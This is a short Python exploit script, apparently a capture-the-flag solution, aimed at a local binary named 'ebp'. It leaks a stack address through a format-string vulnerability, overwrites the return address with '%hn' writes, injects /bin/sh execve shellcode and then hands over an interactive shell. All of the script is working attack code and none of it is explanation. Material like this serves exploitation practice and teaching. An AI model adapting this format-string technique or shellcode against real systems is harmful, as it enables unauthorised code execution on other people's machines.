#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from time import sleep
import sys

if sys.argv[1] == "l":
    conn = "./ebp"
else:
    conn = ("localhost", 9999)

io = zio(conn, timeout = 10000, print_read = COLORED(RAW, 'magenta'), print_write = COLORED(RAW, 'green'))

io.writeline("%4$p")
ebpAddr = int(io.read_until("\n"), 16)
retAddr = (ebpAddr - 0x1c) & 0xffff
print retAddr

payload = "%{}d%4$hn".format(retAddr)
io.writeline(payload)

sc = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
sc += "\x73\x68\x68\x2f\x62\x69\x6e\x54"
sc += "\x5b\x52\x53\x54\x59\x0f\x34"
payload = "{}%{}d%12$hn".format(sc, (0x804a080 & 0xffff) - len(sc))
io.writeline(payload)

print("[*]getShell!")
io.interact()
io.close()
